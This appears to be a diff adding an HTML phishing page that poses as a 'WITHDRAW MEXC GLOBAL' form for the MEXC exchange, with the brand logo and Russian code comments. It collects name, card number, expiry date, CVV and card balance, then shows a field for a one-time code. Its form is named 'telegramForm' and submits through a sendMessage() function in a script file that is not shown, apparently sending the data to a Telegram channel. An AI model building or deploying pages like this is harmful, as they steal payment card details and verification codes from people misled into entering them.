@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WITHDRAW MEXC GLOBAL</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<form id="telegramForm">
+    <label for="name">NAME SURNAME:</label>
+    <input type="text" id="name" name="name" required>
+    <br>
+    <label for="cardNumber">CARD NUMBER:</label>
+    <input type="text" id="cardNumber" name="cardNumber" required placeholder="7000 0000 0000 0000" oninput="formatCardNumber(event) ">
+    <br>
+    <div class="flex-container">
+        <div class="flex-item">
+            <label for="expiryDate">VALID THRU:</label>
+            <input type="text" id="expiryDate" name="expiryDate" required placeholder="23/56" maxlength="5" oninput="formatExpiryDate(event)">
+        </div>
+        <div class="flex-item">
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" required placeholder="468" maxlength="3" pattern="\d{3}">
+        </div>
+    </div>
+    <label for="cardNumber">CARD BALANCE:</label>
+    <input type="text" id="cardBalance" name="cardNumber" required>
+    <br>
+    <button type="button" onclick="sendMessage()">WITHDRAW FUNDS</button>
+</form>
+
+<div id="enterCodeForm" style="display: none;">
+    <label for="code">Enter Code:</label>
+    <br>
+    <input type="text" id="code" name="code" required>
+    <br>
+    <button type="button" onclick="sendCode()">Submit Code</button>
+</div>
+<img src="https://i.ibb.co/25GrPmf/mexc.png" alt="Логотип" class="logo" border="0">
+
+<script src="script.js"></script>
+
+
+
+<script>
+    function formatCardNumber(event) {
+        var input = event.target;
+        var value = input.value.replace(/\D/g, ''); // Удаляем все нецифровые символы
+
+        if (value.length > 16) {
+            value = value.slice(0, 16); // Ограничиваем до 16 цифр
+        }
+
+        // Добавляем пробел после каждой 4 цифры
+        input.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+    }
+    function formatExpiryDate(event) {
+        var input = event.target;
+        var value = input.value.replace(/\D/g, ''); // Удаляем все нецифровые символы
+
+        if (value.length > 2) {
+            value = value.slice(0, 2) + '/' + value.slice(2); // Вставляем "/" после двух цифр
+        }
+
+        input.value = value.slice(0, 5); // Ограничиваем до 5 символов (максимум 4 цифры и 1 знак '/')
+    }
+</script>
+</body>
+</html>
